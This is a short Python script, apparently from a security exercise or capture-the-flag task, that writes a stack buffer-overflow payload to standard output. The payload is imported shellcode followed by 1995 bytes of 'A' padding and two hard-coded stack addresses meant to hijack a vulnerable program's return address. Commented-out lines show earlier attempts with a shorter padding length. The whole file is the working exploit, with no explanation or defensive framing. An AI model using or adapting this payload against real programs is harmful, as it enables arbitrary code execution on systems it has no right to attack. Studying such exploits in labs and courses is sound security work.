from shellcode import shellcode
import sys
#sys.stdout.buffer.write(b"x\41x\41" + shellcode + (b"\x41" * 59)) #+ b"\xf8\xe8\xf6\xff")
#sys.stdout.buffer.write(b"\x41" * 59)
sys.stdout.buffer.write(shellcode + (b"\x41" * 1995) + b"\x58\xe1\xf6\xff\x6c\xe9\xf6\xff")